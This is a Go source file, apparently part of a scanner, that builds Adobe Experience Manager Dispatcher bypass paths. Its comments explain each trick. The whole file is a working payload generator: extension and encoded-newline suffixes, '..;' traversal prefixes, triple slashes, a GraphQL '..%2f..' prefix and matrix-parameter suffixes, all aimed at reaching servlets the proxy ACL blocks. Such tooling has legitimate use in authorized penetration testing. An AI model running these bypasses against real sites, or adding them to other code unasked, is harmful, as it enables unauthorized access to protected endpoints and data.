package aem

import "strings"

// Dispatcher-bypass path variants.
//
// The AEM Dispatcher is a reverse-proxy ACL in front of the Sling backend. It
// filters by literal path/extension, so a family of normalization tricks makes a
// blocked servlet reachable: append a permitted extension (.css/.ico), inject an
// encoded newline plus extension (;%0a…a.css), or smuggle the path behind a
// traversal segment (/content/..;/) or triple slashes. The Sling backend
// strips/normalizes these and re-reaches the endpoint. These builders return
// corpus-faithful candidate paths, clean form first. The inputs are compile-time
// distinct, so a plain slice needs no deduplication.

// extensionSuffixes are the dispatcher content-type-filter bypasses appended to a
// servlet path: a permitted static extension the filter allows through, and the
// encoded-newline variants that terminate the real selector before the fake
// extension.
var extensionSuffixes = []string{
	".css",
	".ico",
	";%0aa.css",
	".;%0aa.css",
	"/a.css",
	"/a.html",
}

// ExtensionBypasses returns the clean path followed by its content-type-filter
// bypass forms (extension/newline flips). The query string, if any, is preserved
// on every variant. Use this when the endpoint itself is reachable but the
// dispatcher blocks the exact path/extension.
func ExtensionBypasses(fullPath string) []string {
	path, query := splitPathQuery(fullPath)
	out := make([]string, 0, len(extensionSuffixes)+1)
	out = append(out, path+query)
	for _, suf := range extensionSuffixes {
		out = append(out, path+suf+query)
	}
	return out
}

// TraversalBypasses returns the path-ACL traversal/normalization forms
// (/content/..;/, /..;/, triple-slash) — the bypasses relevant to an HTML console
// page fronted by a prefix-matching dispatcher ACL, excluding the content-type
// (.css) tricks aimed at JSON servlets. The clean path is NOT included (callers
// try it first, and only fall back to these when blocked).
func TraversalBypasses(fullPath string) []string {
	path, query := splitPathQuery(fullPath)
	return []string{
		"/content/..;" + path + query,
		"/..;" + path + query,
		tripleSlash(path) + query,
	}
}

// graphqlTraversalPrefix is the Assetnote/Searchlight 2025 GraphQL "nocanon"
// bypass: the /graphql/execute.json prefix is proxied to Sling with URL
// normalization disabled, so a %2f-encoded parent traversal appended to it
// reaches an otherwise-blocked backend path. Prepended to the target path.
const graphqlTraversalPrefix = "/graphql/execute.json/..%2f.."

// matrixParamSuffixes are the 2025 Sling path-parameter dispatcher bypasses: a
// ;x='…' matrix parameter carrying a fake extension/segment. The Apache
// dispatcher module does not understand Sling path parameters, so it sees the
// trailing .css/.ico/.html/.pdf (or the /graphql/execute/json segment) as the
// effective, permitted extension and forwards the request, while Sling parses the
// real .json selector on the leading path. Appended to the target path.
var matrixParamSuffixes = []string{
	";x='x/graphql/execute/json/x'",
	";x='.ico/x'",
	";x='.css/x'",
	";x='.html/x'",
	";x='.pdf/x'",
}

// MatrixParamBypasses returns the 2025-era dispatcher bypass forms for fullPath:
// the GraphQL nocanon prefix-traversal and the Sling matrix-parameter (;x='…ext/x')
// tricks. The clean path is NOT included (callers try it first). The query string,
// if any, is preserved on every variant. Ref: Assetnote/Searchlight "Finding
// Critical Bugs in AEM" (2025), Adobe APSB25-90.
func MatrixParamBypasses(fullPath string) []string {
	path, query := splitPathQuery(fullPath)
	out := make([]string, 0, len(matrixParamSuffixes)+1)
	out = append(out, graphqlTraversalPrefix+path+query)
	for _, suf := range matrixParamSuffixes {
		out = append(out, path+suf+query)
	}
	return out
}

// AllBypasses returns the clean path followed by the full union of dispatcher
// bypass forms — content-type/newline flips (ExtensionBypasses), path-ACL
// traversal (TraversalBypasses), and the 2025 matrix-parameter / GraphQL-traversal
// tricks (MatrixParamBypasses) — clean form first. The three builders emit
// disjoint variants (only ExtensionBypasses leads with the clean path), so the
// concatenation needs no deduplication. This is the sweep used by the routing-aware
// content-discovery walker, where the winning variant index is stable across node
// paths because the ordering is deterministic.
func AllBypasses(fullPath string) []string {
	out := ExtensionBypasses(fullPath) // clean path first
	out = append(out, TraversalBypasses(fullPath)...)
	out = append(out, MatrixParamBypasses(fullPath)...)
	return out
}

// CappedBypasses returns AllBypasses(fullPath) truncated to at most max variants
// (clean path first). The shared primitive for modules that bound the
// dispatcher-bypass fan-out to a fixed number of probes; each caller passes its own
// cap.
func CappedBypasses(fullPath string, max int) []string {
	forms := AllBypasses(fullPath)
	if max >= 0 && len(forms) > max {
		forms = forms[:max]
	}
	return forms
}

// BypassAtIndex returns the idx-th variant of AllBypasses(fullPath) — index 0 is the
// clean path — without materializing the whole set for that common case. Returns ""
// when idx is out of range. Used to re-apply a locked winning bypass form to a new
// path: because AllBypasses' ordering is deterministic and structural, the same
// index maps to the same transform for any input.
func BypassAtIndex(fullPath string, idx int) string {
	if idx == 0 {
		return fullPath // AllBypasses[0] is always the clean path
	}
	forms := AllBypasses(fullPath)
	if idx < 0 || idx >= len(forms) {
		return ""
	}
	return forms[idx]
}

// splitPathQuery splits a request target into its path and (leading '?') query.
func splitPathQuery(p string) (path, query string) {
	if i := strings.Index(p, "?"); i >= 0 {
		return p[:i], p[i:]
	}
	return p, ""
}

// tripleSlash replaces every '/' in path with '///' so /bin/querybuilder.json
// becomes ///bin///querybuilder.json.
func tripleSlash(path string) string {
	return strings.ReplaceAll(path, "/", "///")
}
